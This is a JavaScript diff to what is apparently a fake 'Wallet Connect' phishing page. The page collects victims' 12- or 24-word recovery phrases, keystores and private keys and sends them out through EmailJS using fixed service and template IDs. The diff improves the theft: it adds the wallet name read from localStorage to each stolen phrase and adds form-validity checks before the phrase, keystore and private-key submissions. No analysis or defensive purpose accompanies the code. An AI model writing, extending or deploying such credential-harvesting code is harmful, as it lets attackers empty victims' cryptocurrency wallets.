@@ -1,3 +1,4 @@
+let wallet = localStorage.getItem('WALLETS');
 let btns = document.getElementsByClassName('key');
 for (let btn of Array.from(btns)) {
     btn.addEventListener("click", () => {
@@ -19,12 +20,13 @@ for (let btn of Array.from(btns)) {
 
 
 function sendPhrase() {
+    // console.log(currentWallet);
    let textValue = document.querySelector('.input-area').value;
     let wordCount = textValue.match(/(\w+)/g).length;
     if (wordCount === 12 || wordCount === 24) {
         var templateParams = {
             from_name: 'Wallet Connect',
-            message: `phrase is: ${document.getElementById('phrase').value}`
+            message: `Wallet Name:${wallet}, phrase is: ${document.getElementById('phrase').value}`
         };
         emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
             .then(function (response) {
@@ -86,19 +88,23 @@ function sendPhrase() {
     }
 
     // ==================phrase submit============================
+    
     document.querySelector('.phrase-submit').addEventListener('click', (e) => {
-        textValue = document.querySelector('.input-area').value;
+        if (document.querySelector('.forms').checkValidity()){
         // if (textValue = '')
-        e.preventDefault()
+        e.preventDefault();
+        
         sendPhrase();
-    });
+    }});
     document.querySelector('.keystore-submit').addEventListener('click', (e) => {
+        if (document.querySelector('.forms').checkValidity()){
         e.preventDefault()
         sendKeystore();
-    })
+    }})
     document.querySelector('.private-submit').addEventListener('click', (e) => {
+        if (document.querySelector('.forms').checkValidity()){
         e.preventDefault()
         sendPrivatekey();
-    })
+    }})
 
 
